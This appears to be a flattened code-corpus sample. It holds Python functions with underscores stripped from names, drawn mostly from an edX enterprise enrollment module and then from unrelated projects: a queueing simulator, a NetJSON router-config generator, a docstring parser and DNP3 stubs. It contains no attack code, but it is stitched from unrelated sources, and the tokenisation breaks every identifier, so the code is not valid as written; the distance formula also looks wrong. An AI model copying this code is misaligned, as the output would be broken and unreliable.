PREMIUM COURSE FLOW URL . format ( course id = course id ) if enterprise catalog uuid : premium flow += '?catalog={catalog uuid}' . format ( catalog uuid = enterprise catalog uuid ) return redirect ( premium flow )
def get enterprise program enrollment page ( self , request , enterprise customer , program details ) : # Safely make the assumption that we can use the first authoring organization. organizations = program details [ 'authoring organizations' ] organization = organizations [ 0 ] if organizations else { } platform name = get configuration value ( 'PLATFORM NAME' , settings . PLATFORM NAME ) program title = program details [ 'title' ] program type details = program details [ 'type details' ] program type = program type details [ 'name' ] # Make any modifications for singular/plural-dependent text. program courses = program details [ 'courses' ] course count = len ( program courses ) course count text = ungettext ( '{count} Course' , '{count} Courses' , course count , ) . format ( count = course count ) effort info text = ungettext min max ( '{} hour per week, per course' , '{} hours per week, per course' , ( '{}-{} hours per week, per course' ) , program details . get ( 'min hours effort per week' ) , program details . get ( 'max hours effort per week' ) , ) length info text = ungettext min max ( '{} week per course' , '{} weeks per course' , ( '{}-{} weeks per course' ) , program details . get ( 'weeks to complete min' ) , program details . get ( 'weeks to complete max' ) , ) # Update some enrollment-related text requirements. if program details [ 'enrolled in program' ] : purchase action = ( 'Purchase all unenrolled courses' ) item = ( 'enrollment' ) else : purchase action = ( 'Pursue the program' ) item = ( 'program enrollment' ) # Add any DSC warning messages. program data sharing consent = get data sharing consent ( request . user . username , enterprise customer . uuid , program uuid = program details [ 'uuid' ] , ) if program data sharing consent . exists and not program data sharing consent . granted : messages . add consent declined message ( request , enterprise customer , program title ) discount data = program details . get ( 'discount data' , { } ) one click purchase eligibility = program details . get ( 'is learner eligible for one click purchase' , False ) # The following messages shouldn't both appear at the same time, and we prefer the eligibility message. if not one click purchase eligibility : messages . add unenrollable item message ( request , 'program' ) elif discount data . get ( 'total incl tax excl discounts' ) is None : messages . add missing price information message ( request , program title ) context data = get global context ( request , enterprise customer ) context data . update ( { 'enrolled in course and paid text' : ( 'enrolled' ) , 'enrolled in course and unpaid text' : ( 'already enrolled, must pay for certificate' ) , 'expected learning items text' : ( "What you'll learn" ) , 'expected learning items show count' : 2 , 'corporate endorsements text' : ( 'Real Career Impact' ) , 'corporate endorsements show count' : 1 , 'see more text' : ( 'See More' ) , 'see less text' : ( 'See Less' ) , 'confirm button text' : ( 'Confirm Program' ) , 'summary header' : ( 'Program Summary' ) , 'price text' : ( 'Price' ) , 'length text' : ( 'Length' ) , 'effort text' : ( 'Effort' ) , 'level text' : ( 'Level' ) , 'course full description text' : ( 'About This Course' ) , 'staff text' : ( 'Course Staff' ) , 'close modal button text' : ( 'Close' ) , 'program not eligible for one click purchase text' : ( 'Program not eligible for one-click purchase.' ) , 'program type description header' : ( 'What is an {platform name} {program type}?' ) . format ( platform name = platform name , program type = program type , ) , 'platform description header' : ( 'What is {platform name}?' ) . format ( platform name = platform name ) , 'organization name' : organization . get ( 'name' ) , 'organization logo' : organization . get ( 'logo image url' ) , 'organization text' : ( 'Presented by {organization}' ) . format ( organization = organization . get ( 'name' ) ) , 'page title' : ( 'Confirm your {item}' ) . format ( item = item ) , 'program type logo' : program type details [ 'logo image' ] . get ( 'medium' , { } ) . get ( 'url' , '' ) , 'program type' : program type , 'program type description' : get program type description ( program type ) , 'program title' : program title , 'program subtitle' : program details [ 'subtitle' ] , 'program overview' : program details [ 'overview' ] , 'program price' : get price text ( discount data . get ( 'total incl tax excl discounts' , 0 ) , request ) , 'program discounted price' : get price text ( discount data . get ( 'total incl tax' , 0 ) , request ) , 'is discounted' : discount data . get ( 'is discounted' , False ) , 'courses' : program courses , 'item bullet points' : [ ( 'Credit- and Certificate-eligible' ) , ( 'Self-paced; courses can be taken in any order' ) , ] , 'purchase text' : ( '{purchase action} for' ) . format ( purchase action = purchase action ) , 'expected learning items' : program details [ 'expected learning items' ] , 'corporate endorsements' : program details [ 'corporate endorsements' ] , 'course count text' : course count text , 'length info text' : length info text , 'effort info text' : effort info text , 'is learner eligible for one click purchase' : one click purchase eligibility , } ) return render ( request , 'enterprise/enterprise program enrollment page.html' , context = context data )
def post ( self , request , enterprise uuid , program uuid ) : verify edx resources ( ) # Create a link between the user and the enterprise customer if it does not already exist. enterprise customer = get enterprise customer or 404 ( enterprise uuid ) with transaction . atomic ( ) : enterprise customer user , = Enterprise Customer User . objects . get or create ( enterprise customer = enterprise customer , user id = request . user . id ) enterprise customer user . update session ( request ) context data = get global context ( request , enterprise customer ) program details , error code = self . get program details ( request , program uuid , enterprise customer ) if error code : return render ( request , ENTERPRISE GENERAL ERROR PAGE , context = context data , status = 404 , ) if program details [ 'certificate eligible for program' ] : # The user is already enrolled in the program, so redirect to the program's dashboard. return redirect ( LMS PROGRAMS DASHBOARD URL . format ( uuid = program uuid ) ) basket page = '{basket url}?{params}' . format ( basket url = BASKET URL , params = urlencode ( [ tuple ( [ 'sku' , sku ] ) for sku in program details [ 'skus' ] ] + [ tuple ( [ 'bundle' , program uuid ] ) ] ) ) if get data sharing consent ( enterprise customer user . username , enterprise customer . uuid , program uuid = program uuid , ) . consent required ( ) : return redirect ( '{grant data sharing url}?{params}' . format ( grant data sharing url = reverse ( 'grant data sharing permissions' ) , params = urlencode ( { 'next' : basket page , 'failure url' : reverse ( 'enterprise program enrollment page' , args = [ enterprise customer . uuid , program uuid ] ) , 'enterprise customer uuid' : enterprise customer . uuid , 'program uuid' : program uuid , } ) ) ) return redirect ( basket page )
def redirect ( self , request , * args , * * kwargs ) : enterprise customer uuid , course run id , course key , program uuid = Router View . get path variables ( * * kwargs ) resource id = course key or course run id or program uuid # Replace enterprise UUID and resource ID with '{}', to easily match with a path in Router View.VIEWS. Example: # /enterprise/fake-uuid/course/course-v1:cool+course+2017/enroll/ -> /enterprise/{}/course/{}/enroll/ path = re . sub ( '{}|{}' . format ( enterprise customer uuid , re . escape ( resource id ) ) , '{}' , request . path ) # Remove course key from kwargs if it exists because delegate views are not expecting it. kwargs . pop ( 'course key' , None ) return self . VIEWS [ path ] . as view ( ) ( request , * args , * * kwargs )
def post ( self , request , * args , * * kwargs ) : # pylint: disable=unused-variable enterprise customer uuid , course run id , course key , program uuid = Router View . get path variables ( * * kwargs ) enterprise customer = get enterprise customer or 404 ( enterprise customer uuid ) if course key : context data = get global context ( request , enterprise customer ) try : kwargs [ 'course id' ] = Router View . get course run id ( request . user , enterprise customer , course key ) except Http404 : error code = 'ENTRV001' log message = ( 'Could not find course run with id {course run id} ' 'for course key {course key} and ' 'for enterprise customer uuid {enterprise customer uuid} ' 'and program {program uuid}. ' 'Returned error code {error code} to user {userid}' . format ( course key = course key , course run id = course run id , enterprise customer uuid = enterprise customer uuid , error code = error code , userid = request . user . id , program uuid = program uuid , ) ) return render page with error code message ( request , context data , error code , log message ) return self . redirect ( request , * args , * * kwargs )
def default content filter ( sender , instance , * * kwargs ) : # pylint: disable=unused-argument if kwargs [ 'created' ] and not instance . content filter : instance . content filter = get default catalog content filter ( ) instance . save ( )
def assign enterprise learner role ( sender , instance , * * kwargs ) : # pylint: disable=unused-argument if kwargs [ 'created' ] and instance . user : enterprise learner role , = System Wide Enterprise Role . objects . get or create ( name = ENTERPRISE LEARNER ROLE ) System Wide Enterprise User Role Assignment . objects . get or create ( user = instance . user , role = enterprise learner role )
def delete enterprise learner role assignment ( sender , instance , * * kwargs ) : # pylint: disable=unused-argument if instance . user : enterprise learner role , = System Wide Enterprise Role . objects . get or create ( name = ENTERPRISE LEARNER ROLE ) try : System Wide Enterprise User Role Assignment . objects . get ( user = instance . user , role = enterprise learner role ) . delete ( ) except System Wide Enterprise User Role Assignment . Does Not Exist : # Do nothing if no role assignment is present for the enterprise customer user. pass
def create roles ( apps , schema editor ) : System Wide Enterprise Role = apps . get model ( 'enterprise' , 'System Wide Enterprise Role' ) System Wide Enterprise Role . objects . update or create ( name = ENTERPRISE ADMIN ROLE ) System Wide Enterprise Role . objects . update or create ( name = ENTERPRISE LEARNER ROLE )
def delete roles ( apps , schema editor ) : System Wide Enterprise Role = apps . get model ( 'enterprise' , 'System Wide Enterprise Role' ) System Wide Enterprise Role . objects . filter ( name in = [ ENTERPRISE ADMIN ROLE , ENTERPRISE LEARNER ROLE ] ) . delete ( )
def get enterprise admin users batch ( self , start , end ) : LOGGER . info ( 'Fetching new batch of enterprise admin users from indexes: %s to %s' , start , end ) return User . objects . filter ( groups name = ENTERPRISE DATA API ACCESS GROUP , is staff = False ) [ start : end ]
def get enterprise operator users batch ( self , start , end ) : LOGGER . info ( 'Fetching new batch of enterprise operator users from indexes: %s to %s' , start , end ) return User . objects . filter ( groups name = ENTERPRISE DATA API ACCESS GROUP , is staff = True ) [ start : end ]
def get enterprise customer users batch ( self , start , end ) : LOGGER . info ( 'Fetching new batch of enterprise customer users from indexes: %s to %s' , start , end ) return User . objects . filter ( pk in = self . get enterprise customer user ids ( ) ) [ start : end ]
def get enterprise enrollment api admin users batch ( self , start , end ) : # pylint: disable=invalid-name LOGGER . info ( 'Fetching new batch of enterprise enrollment admin users from indexes: %s to %s' , start , end ) return User . objects . filter ( groups name = ENTERPRISE ENROLLMENT API ACCESS GROUP , is staff = False ) [ start : end ]
def get enterprise catalog admin users batch ( self , start , end ) : Application = apps . get model ( OAUTH2 PROVIDER APPLICATION MODEL ) # pylint: disable=invalid-name LOGGER . info ( 'Fetching new batch of enterprise catalog admin users from indexes: %s to %s' , start , end ) catalog admin user ids = Application . objects . filter ( user id in = self . get enterprise customer user ids ( ) ) . exclude ( name = EDX ORG NAME ) . values ( 'user id' ) return User . objects . filter ( pk in = catalog admin user ids ) [ start : end ]
def assign enterprise role to users ( self , get batch method , options , is feature role = False ) : role name = options [ 'role' ] batch limit = options [ 'batch limit' ] batch sleep = options [ 'batch sleep' ] batch offset = options [ 'batch offset' ] current batch index = batch offset users batch = get batch method ( batch offset , batch offset + batch limit ) role class = System Wide Enterprise Role role assignment class = System Wide Enterprise User Role Assignment if is feature role : role class = Enterprise Feature Role role assignment class = Enterprise Feature User Role Assignment enterprise role = role class . objects . get ( name = role name ) while users batch . count ( ) > 0 : for index , user in enumerate ( users batch ) : LOGGER . info ( 'Processing user with index %s and id %s' , current batch index + index , user . id ) role assignment class . objects . get or create ( user = user , role = enterprise role ) sleep ( batch sleep ) current batch index += len ( users batch ) users batch = get batch method ( current batch index , current batch index + batch limit )
def handle ( self , * args , * * options ) : LOGGER . info ( 'Starting assigning enterprise roles to users!' ) role = options [ 'role' ] if role == ENTERPRISE ADMIN ROLE : # Assign admin role to non-staff users with enterprise data api access. self . assign enterprise role to users ( self . get enterprise admin users batch , options ) elif role == ENTERPRISE OPERATOR ROLE : # Assign operator role to staff users with enterprise data api access. self . assign enterprise role to users ( self . get enterprise operator users batch , options ) elif role == ENTERPRISE LEARNER ROLE : # Assign enterprise learner role to enterprise customer users. self . assign enterprise role to users ( self . get enterprise customer users batch , options ) elif role == ENTERPRISE ENROLLMENT API ADMIN ROLE : # Assign enterprise enrollment api admin to non-staff users with enterprise data api access. self . assign enterprise role to users ( self . get enterprise enrollment api admin users batch , options , True ) elif role == ENTERPRISE CATALOG ADMIN ROLE : # Assign enterprise catalog admin role to users with having credentials in catalog. self . assign enterprise role to users ( self . get enterprise catalog admin users batch , options , True ) else : raise Command Error ( 'Please provide a valid role name. Supported roles are {admin} and {learner}' . format ( admin = ENTERPRISE ADMIN ROLE , learner = ENTERPRISE LEARNER ROLE ) ) LOGGER . info ( 'Successfully finished assigning enterprise roles to users!' )
def get enterprise customer for running pipeline ( request , pipeline ) : # pylint: disable=invalid-name sso provider id = request . GET . get ( 'tpa hint' ) if pipeline : sso provider id = Registry . get from pipeline ( pipeline ) . provider id return get enterprise customer for sso ( sso provider id )
def create session ( self ) : session = requests . Session ( ) session . timeout = self . SESSION TIMEOUT oauth access token , expires at = SAP Success Factors API Client . get oauth access token ( self . enterprise configuration . sapsf base url , self . enterprise configuration . key , self . enterprise configuration . secret , self . enterprise configuration . sapsf company id , self . enterprise configuration . sapsf user id , self . enterprise configuration . user type ) session . headers [ 'Authorization' ] = 'Bearer {}' . format ( oauth access token ) session . headers [ 'content-type' ] = 'application/json' self . session = session self . expires at = expires at
def call search students recursively ( self , sap search student url , all inactive learners , page size , start at ) : search student paginated url = '{sap search student url}&{pagination criterion}' . format ( sap search student url = sap search student url , pagination criterion = '$count=true&$top={page size}&$skip={start at}' . format ( page size = page size , start at = start at , ) , ) try : response = self . session . get ( search student paginated url ) sap inactive learners = response . json ( ) except ( Connection Error , Timeout ) : LOGGER . warning ( 'Unable to fetch inactive learners from SAP search Student API with url ' '"{%s}".' , search student paginated url , ) return None if 'error' in sap inactive learners : LOGGER . warning ( 'SAP search Student API for customer %s and base url %s returned response with ' 'error message "%s" and with error code "%s".' , self . enterprise configuration . enterprise customer . name , self . enterprise configuration . sapsf base url , sap inactive learners [ 'error' ] . get ( 'message' ) , sap inactive learners [ 'error' ] . get ( 'code' ) , ) return None new page start at = page size + start at all inactive learners += sap inactive learners [ 'value' ] if sap inactive learners [ '@odata.count' ] > new page start at : return self . call search students recursively ( sap search student url , all inactive learners , page size = page size , start at = new page start at , ) return all inactive learners
def filter queryset ( self , request , queryset , view ) : if not request . user . is staff : filter kwargs = { view . USER ID FILTER : request . user . id } queryset = queryset . filter ( * * filter kwargs ) return queryset
def filter queryset ( self , request , queryset , view ) : if request . user . is staff : email = request . query params . get ( 'email' , None ) username = request . query params . get ( 'username' , None ) query parameters = { } if email : query parameters . update ( email = email ) if username : query parameters . update ( username = username ) if query parameters : users = User . objects . filter ( * * query parameters ) . values list ( 'id' , flat = True ) queryset = queryset . filter ( user id in = users ) else : queryset = queryset . filter ( user id = request . user . id ) return queryset
def handle transmission error ( self , learner data , request exception ) : try : sys msg = request exception . response . content except Attribute Error : sys msg = 'Not available' LOGGER . error ( ( 'Failed to send completion status call for enterprise enrollment %s' 'with payload %s' '\n Error message: %s' '\n System message: %s' ) , learner data . enterprise course enrollment id , learner data , str ( request exception ) , sys msg )
def validate image extension ( value ) : config = get app config ( ) ext = os . path . splitext ( value . name ) [ 1 ] if config and not ext . lower ( ) in config . valid image extensions : raise Validation Error ( ( "Unsupported file extension." ) )
def validate image size ( image ) : config = get app config ( ) valid max image size in bytes = config . valid max image size * 1024 if config and not image . size <= valid max image size in bytes : raise Validation Error ( ( "The logo image file size must be less than or equal to %s KB." ) % config . valid max image size )
def get enterprise customer from catalog id ( catalog id ) : try : return str ( Enterprise Customer Catalog . objects . get ( pk = catalog id ) . enterprise customer . uuid ) except Enterprise Customer Catalog . Does Not Exist : return None
def get requirements ( requirements file ) : lines = open ( requirements file ) . readlines ( ) dependencies = [ ] dependency links = [ ] for line in lines : package = line . strip ( ) if package . startswith ( '#' ) : # Skip pure comment lines continue if any ( package . startswith ( prefix ) for prefix in VCS PREFIXES ) : # VCS reference for dev purposes, expect a trailing comment # with the normal requirement package link , , package = package . rpartition ( '#' ) # Remove -e <version control> string package link = re . sub ( r'(.*)(?P<dependency link>https?.*$)' , r'\g<dependency link>' , package link ) package = re . sub ( r'(egg=)?(?P<package name>.*)==.*$' , r'\g<package name>' , package ) package version = re . sub ( r'.*[^=]==' , '' , line . strip ( ) ) if package : dependency links . append ( '{package link}#egg={package}-{package version}' . format ( package link = package link , package = package , package version = package version , ) ) else : # Ignore any trailing comment package , , = package . partition ( '#' ) # Remove any whitespace and assume non-empty results are dependencies package = package . strip ( ) if package : dependencies . append ( package ) return dependencies , dependency links
def transmit learner data ( self , user ) : exporter = self . get learner data exporter ( user ) transmitter = self . get learner data transmitter ( ) transmitter . transmit ( exporter )
def transmit content metadata ( self , user ) : exporter = self . get content metadata exporter ( user ) transmitter = self . get content metadata transmitter ( ) transmitter . transmit ( exporter . export ( ) )
def get ( self , request , template id , view type ) : template = get object or 404 ( Enrollment Notification Email Template , pk = template id ) if view type not in self . view type contexts : return Http Response ( status = 404 ) base context = self . view type contexts [ view type ] . copy ( ) base context . update ( { 'user name' : self . get user name ( request ) } ) return Http Response ( template . render html template ( base context ) , content type = 'text/html' )
def build admin context ( request , customer ) : opts = customer . meta codename = get permission codename ( 'change' , opts ) has change permission = request . user . has perm ( '%s.%s' % ( opts . app label , codename ) ) return { 'has change permission' : has change permission , 'opts' : opts }
def build context ( self , request , enterprise customer uuid ) : enterprise customer = Enterprise Customer . objects . get ( uuid = enterprise customer uuid ) # pylint: disable=no-member context = { self . Context Parameters . ENTERPRISE CUSTOMER : enterprise customer , } context . update ( admin . site . each context ( request ) ) context . update ( self . build admin context ( request , enterprise customer ) ) return context
def build context ( self , request , customer uuid ) : # TODO: pylint acts stupid - find a way around it without suppressing enterprise customer = Enterprise Customer . objects . get ( uuid = customer uuid ) # pylint: disable=no-member search keyword = self . get search keyword ( request ) linked learners = self . get enterprise customer user queryset ( request , search keyword , customer uuid ) pending linked learners = self . get pending users queryset ( search keyword , customer uuid ) context = { self . Context Parameters . ENTERPRISE CUSTOMER : enterprise customer , self . Context Parameters . PENDING LEARNERS : pending linked learners , self . Context Parameters . LEARNERS : linked learners , self . Context Parameters . SEARCH KEYWORD : search keyword or '' , self . Context Parameters . ENROLLMENT URL : settings . LMS ENROLLMENT API PATH , } context . update ( admin . site . each context ( request ) ) context . update ( self . build admin context ( request , enterprise customer ) ) return context
def from children ( cls , program uuid , * children ) : if not children or any ( child is None for child in children ) : return None granted = all ( ( child . granted for child in children ) ) exists = any ( ( child . exists for child in children ) ) usernames = set ( [ child . username for child in children ] ) enterprises = set ( [ child . enterprise customer for child in children ] ) if not len ( usernames ) == len ( enterprises ) == 1 : raise Invalid Proxy Consent ( 'Children used to create a bulk proxy consent object must ' 'share a single common username and Enterprise Customer.' ) username = children [ 0 ] . username enterprise customer = children [ 0 ] . enterprise customer return cls ( enterprise customer = enterprise customer , username = username , program uuid = program uuid , exists = exists , granted = granted , child consents = children )
def create roles ( apps , schema editor ) : Enterprise Feature Role = apps . get model ( 'enterprise' , 'Enterprise Feature Role' ) Enterprise Feature Role . objects . update or create ( name = ENTERPRISE CATALOG ADMIN ROLE ) Enterprise Feature Role . objects . update or create ( name = ENTERPRISE DASHBOARD ADMIN ROLE ) Enterprise Feature Role . objects . update or create ( name = ENTERPRISE ENROLLMENT API ADMIN ROLE )
def delete roles ( apps , schema editor ) : Enterprise Feature Role = apps . get model ( 'enterprise' , 'Enterprise Feature Role' ) Enterprise Feature Role . objects . filter ( name in = [ ENTERPRISE CATALOG ADMIN ROLE , ENTERPRISE DASHBOARD ADMIN ROLE , ENTERPRISE ENROLLMENT API ADMIN ROLE ] ) . delete ( )
def track enrollment ( pathway , user id , course run id , url path = None ) : track event ( user id , 'edx.bi.user.enterprise.onboarding' , { 'pathway' : pathway , 'url path' : url path , 'course run id' : course run id , } )
def is course run upgradeable ( course run ) : now = datetime . datetime . now ( pytz . UTC ) for seat in course run . get ( 'seats' , [ ] ) : if seat . get ( 'type' ) == 'verified' : upgrade deadline = parse datetime handle invalid ( seat . get ( 'upgrade deadline' ) ) return not upgrade deadline or upgrade deadline > now return False
def get closest course run ( course runs ) : if len ( course runs ) == 1 : return course runs [ 0 ] now = datetime . datetime . now ( pytz . UTC ) # course runs with no start date should be considered last. never = now - datetime . timedelta ( days = 3650 ) return min ( course runs , key = lambda x : abs ( get course run start ( x , never ) - now ) )
def parse course key ( course identifier ) : try : course run key = Course Key . from string ( course identifier ) except Invalid Key Error : # Assume we already have a course key. return course identifier return quote plus ( ' ' . join ( [ course run key . org , course run key . course ] ) )
def create roles ( apps , schema editor ) : System Wide Enterprise Role = apps . get model ( 'enterprise' , 'System Wide Enterprise Role' ) System Wide Enterprise Role . objects . update or create ( name = ENTERPRISE OPERATOR ROLE )
def delete roles ( apps , schema editor ) : System Wide Enterprise Role = apps . get model ( 'enterprise' , 'System Wide Enterprise Role' ) System Wide Enterprise Role . objects . filter ( name in = [ ENTERPRISE OPERATOR ROLE ] ) . delete ( )
def lrs ( self ) : return Remote LRS ( version = self . lrs configuration . version , endpoint = self . lrs configuration . endpoint , auth = self . lrs configuration . authorization header , )
def ecommerce coupon url ( self , instance ) : if not instance . entitlement id : return "N/A" return format html ( '<a href="{base url}/coupons/{id}" target=" blank">View coupon "{id}" details</a>' , base url = settings . ECOMMERCE PUBLIC URL ROOT , id = instance . entitlement id )
def drop Historical Table ( apps , schema editor ) : table name = 'sap success factors historicalsapsuccessfactorsenterprisecus80ad' if table name in connection . introspection . table names ( ) : migrations . Delete Model ( name = table name , )
def get clear catalog id action ( description = None ) : description = description or ( "Unlink selected objects from existing course catalogs" ) def clear catalog id ( modeladmin , request , queryset ) : # pylint: disable=unused-argument queryset . update ( catalog = None ) clear catalog id . short description = description return clear catalog id
def calculate distance ( latlon1 , latlon2 ) : lat1 , lon1 = latlon1 lat2 , lon2 = latlon2 dlon = lon2 - lon1 dlat = lat2 - lat1 R = 6371 # radius of the earth in kilometers a = np . sin ( dlat / 2 ) ** 2 + np . cos ( lat1 ) * np . cos ( lat2 ) * ( np . sin ( dlon / 2 ) ) ** 2 c = 2 * np . pi * R * np . arctan2 ( np . sqrt ( a ) , np . sqrt ( 1 - a ) ) / 180 return c
def matrix2dict ( matrix , etype = False ) : n = len ( matrix ) adj = { k : { } for k in range ( n ) } for k in range ( n ) : for j in range ( n ) : if matrix [ k , j ] != 0 : adj [ k ] [ j ] = { } if not etype else matrix [ k , j ] return adj
def get queues ( g , queues , edge , edge type ) : INT = numbers . Integral if isinstance ( queues , INT ) : queues = [ queues ] elif queues is None : if edge is not None : if isinstance ( edge , tuple ) : if isinstance ( edge [ 0 ] , INT ) and isinstance ( edge [ 1 ] , INT ) : queues = [ g . edge index [ edge ] ] elif isinstance ( edge [ 0 ] , collections . Iterable ) : if np . array ( [ len ( e ) == 2 for e in edge ] ) . all ( ) : queues = [ g . edge index [ e ] for e in edge ] else : queues = [ g . edge index [ edge ] ] elif edge type is not None : if isinstance ( edge type , collections . Iterable ) : edge type = set ( edge type ) else : edge type = set ( [ edge type ] ) tmp = [ ] for e in g . edges ( ) : if g . ep ( e , 'edge type' ) in edge type : tmp . append ( g . edge index [ e ] ) queues = np . array ( tmp , int ) if queues is None : queues = range ( g . number of edges ( ) ) return queues
def copy ( self ) : net = Queue Network ( None ) net . g = self . g . copy ( ) net . max agents = copy . deepcopy ( self . max agents ) net . n V = copy . deepcopy ( self . n V ) net . n E = copy . deepcopy ( self . n E ) net . num agents = copy . deepcopy ( self . num agents ) net . num events = copy . deepcopy ( self . num events ) net . t = copy . deepcopy ( self . t ) net . initialized = copy . deepcopy ( self . initialized ) net . prev edge = copy . deepcopy ( self . prev edge ) net . blocking = copy . deepcopy ( self . blocking ) net . colors = copy . deepcopy ( self . colors ) net . out edges = copy . deepcopy ( self . out edges ) net . in edges = copy . deepcopy ( self . in edges ) net . edge2queue = copy . deepcopy ( self . edge2queue ) net . route probs = copy . deepcopy ( self . route probs ) if net . initialized : keys = [ q . key ( ) for q in net . edge2queue if q . time < np . infty ] net . fancy heap = Priority Queue ( keys , net . n E ) return net
def reset colors ( self ) : for k , e in enumerate ( self . g . edges ( ) ) : self . g . set ep ( e , 'edge color' , self . edge2queue [ k ] . colors [ 'edge color' ] ) for v in self . g . nodes ( ) : self . g . set vp ( v , 'vertex fill color' , self . colors [ 'vertex fill color' ] )
def strip comment marker ( text ) : lines = [ ] for line in text . splitlines ( ) : lines . append ( line . lstrip ( '#' ) ) text = textwrap . dedent ( '\n' . join ( lines ) ) return text
def get class traits ( klass ) : # FIXME: gracefully handle errors here or in the caller? source = inspect . getsource ( klass ) cb = Comment Blocker ( ) cb . process file ( String IO ( source ) ) mod ast = compiler . parse ( source ) class ast = mod ast . node . nodes [ 0 ] for node in class ast . code . nodes : # FIXME: handle other kinds of assignments? if isinstance ( node , compiler . ast . Assign ) : name = node . nodes [ 0 ] . name rhs = unparse ( node . expr ) . strip ( ) doc = strip comment marker ( cb . search for comment ( node . lineno , default = '' ) ) yield name , rhs , doc
def add ( self , string , start , end , line ) : if string . strip ( ) : # Only add if not entirely whitespace. self . start lineno = min ( self . start lineno , start [ 0 ] ) self . end lineno = max ( self . end lineno , end [ 0 ] )
def process file ( self , file ) : if sys . version info [ 0 ] >= 3 : nxt = file . next else : nxt = file . next for token in tokenize . generate tokens ( nxt ) : self . process token ( * token ) self . make index ( )
def process token ( self , kind , string , start , end , line ) : if self . current block . is comment : if kind == tokenize . COMMENT : self . current block . add ( string , start , end , line ) else : self . new noncomment ( start [ 0 ] , end [ 0 ] ) else : if kind == tokenize . COMMENT : self . new comment ( string , start , end , line ) else : self . current block . add ( string , start , end , line )
def new noncomment ( self , start lineno , end lineno ) : block = Non Comment ( start lineno , end lineno ) self . blocks . append ( block ) self . current block = block
def load ( self , config ) : if isinstance ( config , six . string types ) : try : config = json . loads ( config ) except Value Error : pass if not isinstance ( config , dict ) : raise Type Error ( 'config block must be an istance ' 'of dict or a valid Net JSON string' ) return config
def merge config ( self , config , templates ) : if not templates : return config # type check if not isinstance ( templates , list ) : raise Type Error ( 'templates argument must be an instance of list' ) # merge templates with main configuration result = { } config list = templates + [ config ] for merging in config list : result = merge config ( result , self . load ( merging ) , self . list identifiers ) return result
def get install context ( self ) : config = self . config # layer2 VPN list l2vpn = [ ] for vpn in self . config . get ( 'openvpn' , [ ] ) : if vpn . get ( 'dev type' ) != 'tap' : continue tap = vpn . copy ( ) l2vpn . append ( tap ) # bridge list bridges = [ ] for interface in self . config . get ( 'interfaces' , [ ] ) : if interface [ 'type' ] != 'bridge' : continue bridge = interface . copy ( ) if bridge . get ( 'addresses' ) : bridge [ 'proto' ] = interface [ 'addresses' ] [ 0 ] . get ( 'proto' ) bridge [ 'ip' ] = interface [ 'addresses' ] [ 0 ] . get ( 'address' ) bridges . append ( bridge ) # crontabs present? cron = False for file in config . get ( 'files' , [ ] ) : path = file [ 'path' ] if path . startswith ( '/crontabs' ) or path . startswith ( 'crontabs' ) : cron = True break # return context return dict ( hostname = config [ 'general' ] [ 'hostname' ] , # hostname is required l2vpn = l2vpn , bridges = bridges , radios = config . get ( 'radios' , [ ] ) , # radios might be empty cron = cron )
def add install ( self , context ) : contents = self . render template ( 'install.sh' , context ) self . config . setdefault ( 'files' , [ ] ) # file list might be empty # add install.sh to list of included files self . add unique file ( { "path" : "/install.sh" , "contents" : contents , "mode" : "755" } )
def add uninstall ( self , context ) : contents = self . render template ( 'uninstall.sh' , context ) self . config . setdefault ( 'files' , [ ] ) # file list might be empty # add uninstall.sh to list of included files self . add unique file ( { "path" : "/uninstall.sh" , "contents" : contents , "mode" : "755" } )
def add tc script ( self ) : # fill context context = dict ( tc options = self . config . get ( 'tc options' , [ ] ) ) # import pdb; pdb.set trace() contents = self . render template ( 'tc script.sh' , context ) self . config . setdefault ( 'files' , [ ] ) # file list might be empty # add tc script.sh to list of included files self . add unique file ( { "path" : "/tc script.sh" , "contents" : contents , "mode" : "755" } )
def render ( self ) : # get jinja2 template template name = '{0}.jinja2' . format ( self . get name ( ) ) template = self . template env . get template ( template name ) # render template and cleanup context = getattr ( self . backend , 'intermediate data' , { } ) output = template . render ( data = context ) return self . cleanup ( output )
def intermediate address ( self , address ) : for key in self . address keys : if key in address : del address [ key ] return address
def intermediate proto ( self , interface , address ) : # proto defaults to static address proto = address . pop ( 'proto' , 'static' ) if 'proto' not in interface : return address proto else : # allow override on interface level return interface . pop ( 'proto' )
def intermediate dns servers ( self , uci , address ) : # allow override if 'dns' in uci : return uci [ 'dns' ] # ignore if using DHCP or if "proto" is none if address [ 'proto' ] in [ 'dhcp' , 'dhcpv6' , 'none' ] : return None dns = self . netjson . get ( 'dns servers' , None ) if dns : return ' ' . join ( dns )
def intermediate dns search ( self , uci , address ) : # allow override if 'dns search' in uci : return uci [ 'dns search' ] # ignore if "proto" is none if address [ 'proto' ] == 'none' : return None dns search = self . netjson . get ( 'dns search' , None ) if dns search : return ' ' . join ( dns search )
def intermediate htmode ( self , radio ) : protocol = radio . pop ( 'protocol' ) channel width = radio . pop ( 'channel width' ) # allow overriding htmode if 'htmode' in radio : return radio [ 'htmode' ] if protocol == '802.11n' : return 'HT{0}' . format ( channel width ) elif protocol == '802.11ac' : return 'VHT{0}' . format ( channel width ) # disables n return 'NONE'
def netjson protocol ( self , radio ) : htmode = radio . get ( 'htmode' ) hwmode = radio . get ( 'hwmode' , None ) if htmode . startswith ( 'HT' ) : return '802.11n' elif htmode . startswith ( 'VHT' ) : return '802.11ac' return '802.{0}' . format ( hwmode )
def netjson channel width ( self , radio ) : htmode = radio . pop ( 'htmode' ) if htmode == 'NONE' : return 20 channel width = htmode . replace ( 'VHT' , '' ) . replace ( 'HT' , '' ) # we need to override htmode if '+' in channel width or '-' in channel width : radio [ 'htmode' ] = htmode channel width = channel width [ 0 : - 1 ] return int ( channel width )
def get install requires ( ) : requirements = [ ] for line in open ( 'requirements.txt' ) . readlines ( ) : # skip to next iteration if comment or empty line if line . startswith ( '#' ) or line == '' or line . startswith ( 'http' ) or line . startswith ( 'git' ) : continue # add line to requirements requirements . append ( line . replace ( '\n' , '' ) ) # add py2-ipaddress if python2 if sys . version info . major < 3 : requirements . append ( 'py2-ipaddress' ) return requirements
def fact ( self , name ) : facts = self . facts ( name = name ) return next ( fact for fact in facts )
def main ( ) : # app = My Master() app = My Master ( log handler = My Logger ( ) , listener = App Channel Listener ( ) , soe handler = SOE Handler ( ) , master application = Master Application ( ) ) log . debug ( 'Initialization complete. In command loop.' ) # Ad-hoc tests can be performed at this point. See master cmd.py for examples. app . shutdown ( ) log . debug ( 'Exiting.' ) exit ( )
def main ( ) : app = Outstation Application ( ) log . debug ( 'Initialization complete. In command loop.' ) # Ad-hoc tests can be inserted here if desired. See outstation cmd.py for examples. app . shutdown ( ) log . debug ( 'Exiting.' ) exit ( )
